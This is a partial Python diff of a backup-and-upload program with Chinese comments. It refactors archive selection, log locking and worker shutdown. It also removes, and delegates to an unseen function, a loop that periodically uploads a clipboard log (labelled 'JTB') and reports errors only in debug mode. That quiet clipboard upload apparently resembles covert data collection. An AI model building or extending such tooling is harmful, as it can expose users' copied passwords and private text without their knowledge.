+        backup_manager._state.get("pending_archives", {}).keys())
     try:
         for path in root.iterdir():
             if not path.is_file():
@@ -2963,11 +3499,23 @@ def find_pending_backup_files(backup_manager, backup_root=None):
             name = path.name
             if not (name.endswith(".tar.gz") or ".tar.gz.part" in name):
                 continue
+            if archive_group_key(name) not in pending_keys:
+                continue
             if backup_manager._is_valid_file(str(path)):
                 pending.append(str(path))
     except OSError as exc:
         logging.error(f"扫描待上传备份失败: {exc}")
-    return sorted(pending)
+
+    # 上传阶段的大文件分片在其原始归档仍存在时应由原始归档统一重建；
+    # 否则重试列表会同时包含原文件和已被重建/删除的旧分片。
+    selected = []
+    for archive_key, paths in group_archive_paths(pending).items():
+        originals = [
+            path for path in paths
+            if os.path.basename(path) == archive_key
+        ]
+        selected.extend(originals or paths)
+    return sorted(selected)
 
 
 def retry_pending_archives(backup_manager):
@@ -3008,6 +3556,16 @@ def evaluate_round_completion(backup_paths, backup_complete, upload_success,
     return not reasons, reasons
 
 
+def _find_file_log_handler(log_file):
+    target = os.path.abspath(log_file)
+    for handler in logging.getLogger().handlers:
+        if not isinstance(handler, logging.FileHandler):
+            continue
+        if os.path.abspath(getattr(handler, "baseFilename", "")) == target:
+            return handler
+    return None
+
+
 def backup_and_upload_logs(backup_manager):
     """备份并上传日志文件"""
     log_file = backup_manager.config.LOG_FILE
@@ -3039,15 +3597,16 @@ def backup_and_upload_logs(backup_manager):
         backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
         backup_path = os.path.join(temp_dir, backup_name)
 
-        lock_path = log_file + '.lock'
-        lock_handle = None
+        file_handler = _find_file_log_handler(log_file)
         try:
-            lock_handle = open(lock_path, 'a', encoding='utf-8')
-            if fcntl is not None:
-                fcntl.flock(lock_handle, fcntl.LOCK_EX)
-
-            with open(log_file, 'rb') as src:
-                snapshot = src.read()
+            if file_handler is not None:
+                file_handler.acquire()
+            try:
+                with open(log_file, 'rb') as src:
+                    snapshot = src.read()
+            finally:
+                if file_handler is not None:
+                    file_handler.release()
 
             if not snapshot or not snapshot.strip():
                 logging.warning("⚠️ 日志内容为空，跳过上传")
@@ -3063,15 +3622,22 @@ def backup_and_upload_logs(backup_manager):
             logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
             if backup_manager.upload_file(str(backup_path)):
                 # 只删除已经成功上传的快照；上传期间新写入的日志必须保留。
-                with open(log_file, 'rb') as current_file:
-                    current_snapshot = current_file.read()
-                if current_snapshot.startswith(snapshot):
-                    remainder = current_snapshot[len(snapshot):]
-                    with open(log_file, 'wb') as current_file:
-                        current_file.write(remainder)
-                    logging.info("✅ 备份日志上传成功，已仅清理已上传快照")
-                else:
-                    logging.warning("⚠️ 日志文件在快照后发生了结构变化，未清空当前日志")
+                if file_handler is not None:
+                    file_handler.acquire()
+                try:
+                    with open(log_file, 'rb') as current_file:
+                        current_snapshot = current_file.read()
+                    if current_snapshot.startswith(snapshot):
+                        remainder = current_snapshot[len(snapshot):]
+                        with open(log_file, 'wb') as current_file:
+                            current_file.write(remainder)
+                        logging.info("✅ 备份日志上传成功，已仅清理已上传快照")
+                    else:
+                        logging.warning(
+                            "⚠️ 日志文件在快照后发生结构变化，未清空当前日志")
+                finally:
+                    if file_handler is not None:
+                        file_handler.release()
             else:
                 logging.error("❌ 备份日志上传失败，保留原始日志")
         except (OSError, IOError, PermissionError) as e:
@@ -3081,13 +3647,6 @@ def backup_and_upload_logs(backup_manager):
             if backup_manager.config.DEBUG_MODE:
                 logging.debug(traceback.format_exc())
         finally:
-            if lock_handle is not None:
-                if fcntl is not None:
-                    try:
-                        fcntl.flock(lock_handle, fcntl.LOCK_UN)
-                    except Exception:
-                        pass
-                lock_handle.close()
             try:
                 if os.path.exists(str(temp_dir)):
                     shutil.rmtree(str(temp_dir))
@@ -3101,80 +3660,12 @@ def backup_and_upload_logs(backup_manager):
             logging.debug(traceback.format_exc())
 
 def clipboard_upload_thread(backup_manager, clipboard_log_path):
-    """JTB上传线程
-    
-    Args:
-        backup_manager: 备份管理器实例
-        clipboard_log_path: JTB日志文件路径
-    """
-    username = getpass.getuser()
-    user_prefix = username[:5] if username else "user"
-    last_upload_time = 0
-    
-    while True:
-        try:
-            current_time = time.time()
-            
-            # 检查是否需要上传（每20分钟检查一次）
-            if current_time - last_upload_time >= BackupConfig.CLIPBOARD_INTERVAL:
-                if os.path.exists(clipboard_log_path):
-                    # 检查文件大小
-                    file_size = os.path.getsize(clipboard_log_path)
-                    if file_size > 0:
-                        # 检查文件内容是否有实际记录
-                        if backup_manager.has_clipboard_content(clipboard_log_path):
-                            # 创建临时文件
-                            temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard')
-                            if backup_manager._ensure_directory(temp_dir):
-                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                                temp_file = os.path.join(temp_dir, f"{user_prefix}_clipboard_{timestamp}.txt")
-                                
-                                try:
-                                    # 复制当前快照，并在上传成功后只清理已上传快照，
-                                    # 保留上传期间新增的 JTB 记录。
-                                    with open(clipboard_log_path, 'rb') as src:
-                                        snapshot = src.read()
-                                    with open(temp_file, 'wb') as dst:
-                                        dst.write(snapshot)
-                                    
-                                    # 上传临时文件
-                                    if backup_manager.upload_file(temp_file):
-                                        with open(clipboard_log_path, 'rb') as current_file:
-                                            current_snapshot = current_file.read()
-                                        if current_snapshot.startswith(snapshot):
-                                            remainder = current_snapshot[len(snapshot):]
-                                            with open(clipboard_log_path, 'wb') as current_file:
-                                                current_file.write(remainder)
-                                        else:
-                                            logging.warning("⚠️ JTB日志在快照后发生了结构变化，未清空当前日志")
-                                        last_upload_time = current_time
-                                        if backup_manager.config.DEBUG_MODE:
-                                            logging.info("📤 JTB日志上传成功")
-                                except Exception as e:
-                                    if backup_manager.config.DEBUG_MODE:
-                                        logging.error(f"❌ JTB日志上传失败: {e}")
-                                finally:
-                                    # 清理临时目录
-                                    try:
-                                        if os.path.exists(temp_dir):
-                                            shutil.rmtree(temp_dir)
-                                    except Exception:
-                                        pass
-                        else:
-                            # 文件没有实际内容，清空文件并重置上传时间
-                            if backup_manager.config.DEBUG_MODE:
-                                logging.info("📋 JTB文件无实际内容，跳过上传")
-                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-                                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
-                            last_upload_time = current_time
-                
-            # 定期检查
-            time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
-            
-        except Exception as e:
-            if backup_manager.config.DEBUG_MODE:
-                logging.error(f"JTB上传线程错误: {e}")
-            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
+    """启动剪贴板上传循环。"""
+    run_clipboard_upload(
+        backup_manager,
+        clipboard_log_path,
+        getattr(backup_manager, "_worker_stop_event", None),
+    )
 
 def main():
     """主函数"""
@@ -3190,6 +3681,7 @@ def main():
 
     lock_path = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.lock')
     lock_handle = None
+    backup_manager = None
     try:
         lock_handle = open(lock_path, 'a+', encoding='utf-8')
         if fcntl is not None:
@@ -3217,17 +3709,24 @@ def main():
         while True:
             try:
                 backup_manager = BackupManager()
-                clean_backup_directory()
+                clean_backup_directory(backup_manager)
                 periodic_backup_upload(backup_manager)
             except KeyboardInterrupt:
                 raise
             except Exception as e:
                 logging.error(f'备份过程发生错误: {str(e)}')
+                if backup_manager is not None:
+                    backup_manager.stop_clipboard_workers()
                 time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
 
     except KeyboardInterrupt:
         logging.info('备份程序被用户中断')
     finally:
+        if backup_manager is not None:
+            try:
+                backup_manager.stop_clipboard_workers()
+            except Exception:
+                pass
         if lock_handle is not None:
             try:
                 if fcntl is not None:
